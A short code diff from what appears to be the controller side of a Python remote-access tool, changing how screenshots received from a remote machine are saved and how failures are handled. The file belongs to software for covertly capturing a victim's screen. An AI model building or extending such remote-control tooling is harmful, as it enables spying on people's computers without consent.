@@ -59,14 +59,14 @@ def shell():
 			screen = open("screenshot_" + str(count) + ".png", "wb")		
 			image = reliable_recv()
 			image_decoded = base64.b64decode(image)
-			if image_decoded[:3] != "[!]":
+			try:
 				screen.write(image_decoded)
 				screen.close()
 				print(colored("[+] screenshot saved successfully as screenshot_"+str(count)+ ".png ","green"))
 				count += 1
-			else:
-				print(colored(image_decoded,'red'))
-				screen.close()
+			except:
+				print(colored("[!] Can't took screenshot"))
+				os.remove("screenshot_" + str(count) + ".png")
 				
 				
 		
